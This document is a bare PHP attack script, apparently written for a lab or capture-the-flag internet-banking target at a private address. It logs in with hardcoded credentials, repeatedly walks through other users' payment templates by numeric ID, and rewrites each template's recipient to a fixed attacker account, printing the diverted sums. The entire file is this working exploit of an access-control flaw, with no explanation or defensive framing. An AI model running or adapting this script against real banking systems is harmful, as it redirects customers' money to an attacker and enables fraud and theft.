<?php

$login       = '100001';
$password    = 'qwerty';
$account     = '90107430600227300001';
$domain      = '10.1.76.100';
$cookie_file = '/tmp/ibank_cookie';

function login($ch, $login, $password, $domain)
{
    $postdata = http_build_query(
            array(
                'login'    => $login,
                'password' => $password,
            )
    );

    curl_setopt_array($ch, array(
        CURLOPT_URL            => $domain . '/auth/login',
        CURLOPT_POST           => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_POSTFIELDS     => $postdata,
    ));

    return curl_exec($ch);
}

function logout($ch, $domain)
{
    curl_setopt_array($ch, array(
        CURLOPT_URL            => $domain . '/auth/logout',
        CURLOPT_FOLLOWLOCATION => 0,
        CURLOPT_POST           => 0,
    ));

    return curl_exec($ch);
}

@unlink($cookie_file);
file_put_contents($cookie_file, "$domain\tFALSE\t/\tFALSE\t0\tmobileInterface\ttrue", FILE_APPEND | LOCK_EX);

$ch = curl_init();

curl_setopt_array($ch, array(
    CURLOPT_HEADER         => 1,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_COOKIEJAR      => $cookie_file,
    CURLOPT_COOKIEFILE     => $cookie_file,
));

login($ch, $login, $password, $domain);

$i = 0;
while (++$i) {
    if ($i > 100) {
        $i = 0;
        continue;
    }
    
    curl_setopt_array($ch, array(
        CURLOPT_URL  => $domain . '/transactions/editTemplate/id/' . $i,
        CURLOPT_POST => 0,
    ));

    $result = curl_exec($ch);

    if (strpos($result, '<h1>404. Page not found</h1>'))
        continue;

    preg_match_all("~<input name=\"(.+)\".+value=\"(.*)\">~mU", $result, $matches);

    $post_data = array();
    foreach ($matches[1] as $key => $name) {
        $value            = $matches[2][$key];
        $post_data[$name] = $value;
    }
    
    if ($post_data['to'] !== $account) {
        $post_data['to'] = $account;

        curl_setopt_array($ch, array(
            CURLOPT_POST       => 1,
            CURLOPT_POSTFIELDS => http_build_query($post_data),
        ));

        $result = curl_exec($ch);
        
        echo "From {$post_data['from']} sum {$post_data['sum']}\n";
    }
}

curl_close($ch);